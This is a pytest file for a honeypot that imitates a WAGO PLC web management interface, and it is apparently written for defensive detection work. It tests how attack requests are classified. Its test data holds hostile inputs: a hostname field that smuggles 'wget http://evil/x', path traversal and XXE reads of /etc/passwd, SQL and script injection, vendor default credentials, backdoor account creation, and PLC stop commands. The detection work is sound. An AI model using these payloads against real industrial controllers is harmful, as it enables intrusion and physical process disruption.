"""WAGO WBM attack detection — Idea 54 Phase 2.

Shapes are derived from the real device surface, not from CVE numbers: no identifier
is bound to a signature until CIRCL confirms it exists, so these assert on what was
observed (`overlong_parameter:hostname=4200`) rather than on a CVE claim.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

from honeylens.honeypots.wago.detector import (
    ENUMERATION_THRESHOLD,
    Detection,
    SourceTracker,
    classify,
)
from honeylens.honeypots.wago.signatures import DEFAULT_CREDENTIALS, OVERLONG_PARAM, SIGNATURES

# --- single-request shapes --------------------------------------------------


@pytest.mark.parametrize(
    "fields,expect_class",
    [
        ({"hostname": "../../../../etc/passwd"}, "traversal"),
        ({"hostname": "pfc;wget http://evil/x"}, "command-injection"),
        ({"hostname": "A" * (OVERLONG_PARAM + 1)}, "overlong-parameter"),
        ({"username": "' or '1'='1", "password": "x"}, "sqli"),
        ({"hostname": "<script>alert(1)</script>"}, "script-injection"),
    ],
)
def test_exploit_shapes_are_recognised(fields, expect_class):
    d = classify("POST", "/wbm/tcpip.php", fields)
    assert d.matched and d.attack_class == expect_class
    assert d.attack_type == "WAGO_EXPLOIT_ATTEMPT"


def test_detection_names_what_it_saw_not_a_cve():
    """A shape with no verified advisory ships with an indicator, never a guess."""
    d = classify("POST", "/wbm/tcpip.php", {"hostname": "A" * 5000})
    assert d.cve_id == ""
    assert any(i.startswith("overlong_parameter:hostname=") for i in d.indicators)


def test_every_bound_cve_was_verified():
    """The anti-slop gate. VERIFIED_CVES is the record of what CIRCL confirmed
    PUBLISHED; nothing may reference an identifier that is not in it."""
    from honeylens.honeypots.wago.signatures import VERIFIED_CVES

    bound = {s.cve_id for s in SIGNATURES if s.cve_id}
    assert bound, "expected at least one verified binding after Phase 3"
    assert bound <= set(VERIFIED_CVES), "a CVE id appeared that is not in the verified set: %s" % (
        bound - set(VERIFIED_CVES)
    )
    for cve in bound:
        assert cve.startswith("CVE-") and len(cve.split("-")) == 3


def test_user_creation_shape_is_narrower_than_a_login():
    """CVE-2023-1698 is unauthenticated user creation. Our decoy has no auth at all,
    so "unauthenticated" cannot be the discriminator — the account-administration
    shape is. A plain login must not be reported as it."""
    login = classify("POST", "/wbm/users.ssi", {"username": "admin", "password": "x"})
    assert login.cve_id == ""
    create = classify(
        "POST",
        "/wbm/users.ssi",
        {"username": "backdoor", "new-password": "x", "user-role": "admin"},
    )
    assert create.cve_id == "CVE-2023-1698"
    assert create.attack_type == "WAGO_EXPLOIT_ATTEMPT"


def test_file_inclusion_shape_carries_its_advisory():
    d = classify("GET", "/wbm/../../../etc/passwd", {})
    assert d.cve_id == "CVE-2023-4089"


def test_xxe_is_caught_in_the_body_not_the_fields():
    d = classify(
        "POST",
        "/wbm/io_config.xml",
        {},
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>',
    )
    assert d.matched and d.attack_class == "xxe"


def test_default_credentials_are_called_out_separately():
    """Vendor defaults mean the attacker knows the device; a dictionary run does not."""
    d = classify("POST", "/wbm/users.ssi", {"username": "admin", "password": "wago"})
    assert d.attack_type == "WAGO_CREDENTIAL_CAPTURE"
    assert d.attack_class == "default-credentials" and d.confidence == "high"
    assert ("admin", "wago") in DEFAULT_CREDENTIALS


def test_ordinary_credentials_are_not_flagged_as_defaults():
    d = classify("POST", "/wbm/users.ssi", {"username": "jdoe", "password": "Tr0ub4dor"})
    assert d.attack_class != "default-credentials"


def test_control_writes_are_typed(monkeypatch):
    stop = classify("POST", "/wbm/administration.php", {"plc-action": "stop"})
    assert stop.attack_type == "WAGO_CONTROL_WRITE" and "plc_stop" in stop.indicators
    write = classify("POST", "/webvisu.htm", {"pump": "on", "setpoint": "95"})
    assert write.attack_type == "WAGO_CONTROL_WRITE"


def test_starting_the_plc_is_not_flagged_like_stopping_it():
    """RUN restores service; STOP and RESET are the destructive pair."""
    assert not classify("POST", "/wbm/administration.php", {"plc-action": "run"}).matched


def test_io_map_read_is_typed():
    d = classify("GET", "/wbm/io_config.xml", {})
    assert d.attack_type == "WAGO_IO_DISCLOSURE"


def test_normal_browsing_is_not_an_attack():
    for path in ("/wbm/state.php", "/wbm/clock.ssi", "/webvisu.htm", "/"):
        assert not classify("GET", path, {}).matched, path


def test_a_broken_matcher_cannot_break_the_decoy(monkeypatch):
    """Answering the attacker outranks classifying them."""
    from honeylens.honeypots.wago import signatures as sig_mod

    boom = sig_mod.Signature(
        "boom", "X", "x", "boom", lambda *a: (_ for _ in ()).throw(RuntimeError("boom"))
    )
    monkeypatch.setattr(sig_mod, "SIGNATURES", [boom, *list(SIGNATURES)])
    import importlib

    from honeylens.honeypots.wago import detector

    importlib.reload(detector)
    try:
        assert detector.classify("GET", "/wbm/io_config.xml", {}).matched
    finally:
        importlib.reload(sig_mod)
        importlib.reload(detector)


def test_all_indicators_are_kept_not_just_the_winner():
    d = classify(
        "POST", "/wbm/tcpip.php", {"hostname": "A" * 5000, "gateway": "../../../../etc/passwd"}
    )
    kinds = {i.split(":")[0] for i in d.indicators}
    assert {"overlong_parameter", "path_traversal"} <= kinds


# --- cross-request behaviour ------------------------------------------------


def test_page_sweep_is_only_visible_over_a_window():
    tracker = SourceTracker()
    pages = [
        "/wbm/state.php",
        "/wbm/rts_info.php",
        "/wbm/tcpip.php",
        "/wbm/port.php",
        "/wbm/snmp.php",
    ]
    out = []
    for p in pages:
        out = tracker.observe("8.8.8.8", p, Detection(), now=1000.0)
    assert any(i.startswith("wbm_enumeration:") for i in out)
    assert len(pages) == ENUMERATION_THRESHOLD


def test_one_page_view_is_not_a_sweep():
    tracker = SourceTracker()
    assert tracker.observe("8.8.8.8", "/wbm/state.php", Detection(), now=1000.0) == []


def test_sweep_expires_with_the_window():
    tracker = SourceTracker(enumeration_window=60.0)
    for i, p in enumerate(["/wbm/state.php", "/wbm/port.php", "/wbm/snmp.php"]):
        tracker.observe("8.8.8.8", p, Detection(), now=1000.0 + i)
    out = tracker.observe("8.8.8.8", "/wbm/clock.ssi", Detection(), now=2000.0)
    assert out == []


def test_recon_then_control_is_the_sequence_that_matters():
    """Read the process map, then change the process — that pair is the story."""
    tracker = SourceTracker()
    tracker.observe(
        "8.8.8.8",
        "/wbm/io_config.xml",
        Detection(
            matched=True,
            attack_type="WAGO_IO_DISCLOSURE",
            indicators=["io_map_read:/wbm/io_config.xml"],
        ),
        now=1000.0,
    )
    out = tracker.observe(
        "8.8.8.8",
        "/webvisu.htm",
        Detection(matched=True, attack_type="WAGO_CONTROL_WRITE"),
        now=1100.0,
    )
    assert any(i.startswith("recon_then_control:") for i in out)


def test_control_without_prior_recon_is_not_chained():
    tracker = SourceTracker()
    out = tracker.observe(
        "9.9.9.9",
        "/webvisu.htm",
        Detection(matched=True, attack_type="WAGO_CONTROL_WRITE"),
        now=1000.0,
    )
    assert out == []


def test_tracker_state_is_bounded():
    """Source addresses are attacker-controlled; the maps must not grow without end."""
    tracker = SourceTracker()
    for i in range(tracker._cap + 200):
        tracker.observe(f"10.0.{i // 256}.{i % 256}", "/wbm/state.php", Detection(), now=1000.0)
    assert len(tracker._pages) <= tracker._cap


# --- the T8 rule family (payloads arriving by other paths) -------------------


@pytest.mark.parametrize(
    "payload,rule",
    [
        ("GET /wbm/io_config.xml HTTP/1.1", "wago_io_config_read"),
        ("POST /wbm/users.ssi\r\n\r\nusername=admin&password=wago", "wago_default_credentials"),
        ("plc-action=stop", "wago_plc_stop"),
        ("GET /wbm/../../../etc/passwd", "wago_wbm_traversal"),
    ],
)
def test_classifier_family_catches_shapes_off_the_honeypot(payload, rule):
    from honeylens.classification.attack_classifier import classify_event_row

    hits = [
        h[1]
        for h in classify_event_row(payload=payload, protocol="HTTP", metadata={"dst_port": 8090})
    ]
    assert rule in hits


def test_wago_family_is_registered():
    from honeylens.classification.rules import _GROUPS, wago

    assert wago in _GROUPS


def test_probe_size_is_reported_honestly(tmp_path):
    """Form values are truncated before classification, so the truncation bound must
    sit above the probe threshold — at 512 every oversized field reported exactly 512
    and a 3 KB buffer probe looked borderline."""
    from honeylens.honeypots.wago.server import MAX_FIELD
    from honeylens.honeypots.wago.signatures import OVERLONG_PARAM

    assert MAX_FIELD > OVERLONG_PARAM * 4
    d = classify("POST", "/wbm/tcpip.php", {"hostname": "A" * 3000})
    assert "overlong_parameter:hostname=3000" in d.indicators
    assert d.confidence == "high"
